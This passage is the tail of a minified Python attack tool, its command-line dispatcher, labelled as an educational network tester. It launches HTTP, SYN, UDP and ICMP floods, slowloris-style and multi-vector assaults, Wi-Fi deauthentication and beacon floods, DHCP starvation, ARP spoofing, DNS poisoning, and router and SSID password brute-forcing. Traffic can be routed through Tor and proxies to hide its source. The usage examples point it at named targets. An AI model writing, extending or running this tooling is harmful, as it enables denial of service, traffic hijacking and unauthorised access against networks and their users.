		elif attack_method==_m:tors_hammer(ip,port,display_name,threads,use_ssl,use_tor,delay_ms,proxy_mgr)
		elif attack_method==_w:multi_vector_assault(ip,port,display_name,threads,use_ssl,proxy_mgr)
	except KeyboardInterrupt:stop_event.set();print(f"\n[!] Stopped. {format_rate()}")
	print(f"\n[Done] {format_rate()}")
def reset_state():
	global stop_event,packets_sent,bytes_sent,start_time,router_disruption_active;stop_event.clear()
	with packets_lock:packets_sent=0;bytes_sent=0
	start_time=_C;router_disruption_active=_E
def cli_mode():
	N='ssid-bruteforce';M='router-bruteforce';L='wifi-deauth';K='deauth';J='router-kill';I='multi';H='tors';G='store_true';F='dns-poison';E='arp-spoof';D='dhcp-starve';C='wifi-beacon';B='ipv4-raw';A='icmp';parser=argparse.ArgumentParser(description='Comprehensive Network Security Tester (Educational) — Cross-Platform',formatter_class=argparse.RawDescriptionHelpFormatter,epilog=textwrap.dedent('        Examples:\n          python net_tester.py --mode http --host example.com --port 80 --threads 300\n          python net_tester.py --mode deauth --ssid "MyWiFi"\n          python net_tester.py --mode ssid-bruteforce --ssid "MyWiFi"\n          python net_tester.py --mode deauth --bssid AA:BB:CC:DD:EE:FF --interface wlan0mon\n          python net_tester.py --mode router-bruteforce --host 192.168.1.1\n\n        Windows‑only deauth:\n          python net_tester.py --mode deauth --ssid "TargetWiFi"    (uses netsh)\n\n        SSID‑Based Bruteforce:\n          python net_tester.py --mode ssid-bruteforce --ssid "TargetWiFi"\n          python net_tester.py --mode ssid-bruteforce              (scans & prompts)\n        '));parser.add_argument('--mode',required=_B,choices=[_A4,_A7,'udp',A,H,I,B,'scan',J,K,L,C,D,E,F,_t,M,N],help='Attack mode');parser.add_argument('--host',help='Target domain or IP');parser.add_argument('--port',type=int,default=80,help='Target port');parser.add_argument('--threads',type=int,default=300,help='Worker threads');parser.add_argument('--ssl',action=G,help='Use SSL/HTTPS');parser.add_argument('--tor',action=G,help='Route through Tor');parser.add_argument('--delay',type=int,default=500,help='Slowloris delay in ms');parser.add_argument('--payload',type=int,default=1024,help='Payload size');parser.add_argument('--scan-ports',action=G,help='Auto‑scan ports');parser.add_argument('--proxy',action='append',default=[],help='Proxy address');parser.add_argument('--bssid',help='Target AP BSSID for WiFi attacks');parser.add_argument('--client',help='Target client MAC for deauth');parser.add_argument('--interface',help='Network interface');parser.add_argument('--channel',type=int,help='WiFi channel');parser.add_argument('--gateway',help='Gateway/router IP');parser.add_argument('--subnet',help='Target subnet for recon');parser.add_argument('--ssid',help='Target SSID (for deauth or SSID bruteforce)');parser.add_argument('--spoof-domain',help='Domain to spoof in DNS poisoning');parser.add_argument('--spoof-ip',help='IP to redirect to in DNS poisoning');args=parser.parse_args();linux_only=[_A7,A,B,C,D,E,F]
	if args.mode in linux_only and IS_WINDOWS:print(f"[X] Mode '{args.mode}' is NOT available on Windows.");sys.exit(1)
	if args.mode==N:reset_state();global start_time;start_time=time.time();ssid_bruteforce(args.ssid);return
	if args.mode==_t:reset_state();start_time=time.time();network_reconnaissance(args.subnet);return
	if args.mode==M:reset_state();start_time=time.time();router_login_bruteforce(args.host,args.port);return
	if args.mode in(K,L):
		reset_state();start_time=time.time()
		try:wifi_deauth_attack(target_bssid=args.bssid,client_mac=args.client,interface=args.interface,channel=args.channel,target_ssid=args.ssid)
		except KeyboardInterrupt:stop_event.set();print(f"\n[!] Stopped. {format_rate()}")
		return
	if args.mode==J:
		router_ip=args.host or get_default_gateway()
		if not router_ip:print('[X] No router IP specified.');sys.exit(1)
		reset_state();start_time=time.time()
		try:router_connection_kill(router_ip,args.threads)
		except KeyboardInterrupt:stop_event.set();print(f"\n[!] Stopped. {format_rate()}")
		return
	if args.mode==C:
		reset_state();start_time=time.time()
		try:wifi_beacon_flood(args.interface)
		except KeyboardInterrupt:stop_event.set();print(f"\n[!] Stopped. {format_rate()}")
		return
	if args.mode==D:
		reset_state();start_time=time.time()
		try:dhcp_starvation_attack(args.interface,args.host)
		except KeyboardInterrupt:stop_event.set();print(f"\n[!] Stopped. {format_rate()}")
		return
	if args.mode==E:
		reset_state();start_time=time.time()
		try:arp_spoof_attack(args.host,args.gateway)
		except KeyboardInterrupt:stop_event.set();print(f"\n[!] Stopped. {format_rate()}")
		return
	if args.mode==F:
		reset_state();start_time=time.time()
		try:dns_poisoning_attack(args.host,args.gateway,args.spoof_domain,args.spoof_ip)
		except KeyboardInterrupt:stop_event.set();print(f"\n[!] Stopped. {format_rate()}")
		return
	if not args.host:print('[X] --host is required for this mode.');sys.exit(1)
	host=args.host
	try:socket.inet_aton(host);ip,display_name=host,host
	except OSError:
		try:ip=socket.gethostbyname(host);display_name=host
		except socket.gaierror:print(f"[X] Cannot resolve {host}");sys.exit(2)
	print(f"[*] Target: {display_name} ({ip})")
	if args.scan_ports:
		open_ports=scan_ports(ip)
		if open_ports:args.port=open_ports[0];print(f"[*] Using first open port: {args.port}")
	proxy_mgr=ProxyManager()
	for proxy_addr in args.proxy:proxy_mgr.add_custom_proxy(proxy_addr)
	if args.tor:proxy_mgr.add_tor()
	reset_state();start_time=time.time()
	try:
		if args.mode==_A4:http_flood(ip,args.port,display_name,args.threads,args.ssl,proxy_mgr)
		elif args.mode==_A7:syn_flood(ip,args.port,args.threads)
		elif args.mode=='udp':udp_flood(ip,args.port,args.threads,args.payload)
		elif args.mode==A:icmp_flood(ip,args.threads,args.payload)
		elif args.mode==H:tors_hammer(ip,args.port,display_name,args.threads,args.ssl,args.tor,args.delay,proxy_mgr)
		elif args.mode==I:multi_vector_assault(ip,args.port,display_name,args.threads,args.ssl,proxy_mgr)
		elif args.mode==B:ipv4_raw_attack(ip,args.threads)
		elif args.mode=='scan':scan_ports(ip)
	except KeyboardInterrupt:stop_event.set();print(f"\n[!] Stopped. {format_rate()}")
	print(f"\n[Done] {format_rate()}")
if __name__=='__main__':
	signal.signal(signal.SIGINT,lambda s,f:(stop_event.set(),sys.exit(0)))
	if len(sys.argv)>1:cli_mode()
	else:main()